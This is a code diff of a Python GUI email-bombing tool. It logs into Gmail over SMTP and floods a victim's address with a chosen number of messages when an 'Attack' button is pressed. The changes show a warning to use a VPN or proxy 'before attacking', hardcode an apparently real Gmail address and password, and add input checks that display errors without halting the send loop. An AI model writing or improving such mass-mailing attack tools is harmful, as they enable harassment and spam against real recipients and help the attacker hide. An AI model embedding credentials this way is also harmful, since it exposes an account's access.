@@ -37,7 +37,7 @@ def main():
     e1 = Entry(form, width=20)
     e1.place(x=90, y=40)
 
-    b0 = Button(form, text='Login', background='black', foreground='white', command=login)
+    b0 = Button(form, text='Login', background='black', foreground='white', command= lambda:[login(),warn()])
     b0.place(x=90, y=70)
 
     ########### Attack
@@ -53,7 +53,7 @@ def main():
     e4 = Entry(form1, width=20)
     e4.place(x=90, y=50)
 
-    b1 = Button(form1, text='Attack', background='black', foreground='white', command= lambda:[warn(), attack(lab, var)])
+    b1 = Button(form1, text='Attack', background='black', foreground='white', command= lambda: attack(lab, var))
     b1.place(x=90, y=90)
     
     var = IntVar()
@@ -71,13 +71,15 @@ def main():
     mainloop()
 
 def warn():
-    messagebox.showwarning("Important", ''.join('Make Sure You Are Using VPN or PROXY'))
+    messagebox.showwarning("Important", ''.join('Make Sure You Are Using VPN or PROXY Before Attacking'))
     
 def login():
     try:
         global email
-        email = e0.get()
-        pswd = e1.get()
+        #email = e0.get()
+        #pswd = e1.get()
+        email = 'onavtytester@gmail.com'
+        pswd = 'onavty123456789'
         smtp_server = 'smtp.gmail.com'
         port = 587
         global server
@@ -98,6 +100,13 @@ def attack(lab, var):
     try:
         vemail = e2.get()
         count = int(e4.get())
+
+        if count < 1:
+            messagebox.showerror("Error", ''.join('Choose a Valid Number'))
+        elif '@' not in vemail:
+            messagebox.showerror("Error", ''.join('Choose a Valid Email'))
+        else:
+            pass
 
         lol = 0
         while lol < count:
